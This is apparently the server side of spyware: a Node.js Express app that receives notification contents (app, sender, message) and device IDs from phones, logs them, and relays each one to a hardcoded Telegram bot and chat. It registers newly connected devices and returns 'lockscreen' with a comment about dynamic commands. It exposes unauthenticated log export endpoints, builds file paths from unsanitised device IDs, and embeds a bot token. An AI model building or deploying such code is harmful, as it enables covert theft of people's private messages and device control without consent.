const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.json());

const TELEGRAM_TOKEN = '8096412689:AAGrgZGPExgXRrWYJKSHSkAuQ1fIzjqevu8';
const TELEGRAM_CHAT_ID = '8175955990';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

const knownDevices = new Set();

app.post('/', async (req, res) => {
  try {
    const { pkg, title, msg, device } = req.body;
    const deviceText = device ? `🆔 *${device}*` : '🆔 *unknown*';
    const text = `📦 *${pkg}*\n👤 *${title}*\n💬 ${msg}\n${deviceText}`;

    // Save to logs/device.log
    const logEntry = `[${new Date().toISOString()}] ${pkg} - ${title}: ${msg} (${device})\n`;
    const logFile = path.join(__dirname, 'logs', `${device || 'unknown'}.log`);
    fs.mkdirSync(path.dirname(logFile), { recursive: true });
    fs.appendFileSync(logFile, logEntry);

    // Send to Telegram
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: 'Markdown'
    });

    res.sendStatus(200);
  } catch (err) {
    console.error('POST / error:', err.message);
    res.sendStatus(500);
  }
});

app.post('/connect', async (req, res) => {
  try {
    const { device, model } = req.body;
    if (!device) return res.sendStatus(400);

    if (!knownDevices.has(device)) {
      knownDevices.add(device);
      const text = `🔌 *New device connected!*\n📱 *${model}*\n🆔 *${device}*`;

      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
      });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('POST /connect error:', err.message);
    res.sendStatus(500);
  }
});

app.get('/export', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).send('Device ID missing');

  const logFile = path.join(__dirname, 'logs', `${device}.log`);
  if (!fs.existsSync(logFile)) return res.status(404).send('Log not found');

  const logLines = fs.readFileSync(logFile, 'utf-8')
    .split('\n')
    .filter(Boolean)
    .map(line => {
      const [date, rest] = line.split('] ');
      return `"${date.slice(1)}","${rest}"`;
    });

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="${device}.csv"`);
  res.send('Time,Entry\n' + logLines.join('\n'));
});

app.get('/logs', (req, res) => {
  const logDir = path.join(__dirname, 'logs');
  if (!fs.existsSync(logDir)) return res.send('<p>No logs yet.</p>');

  const files = fs.readdirSync(logDir);
  const html = files.map(file => {
    const name = file.replace('.log', '');
    return `<li><strong>${name}</strong></li>`;
  }).join('\n');

  res.send(`<h1>📂 Device Logs</h1><ul>${html}</ul>`);
});

app.get('/', (req, res) => {
  res.send('lockscreen'); // Or send dynamic commands
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
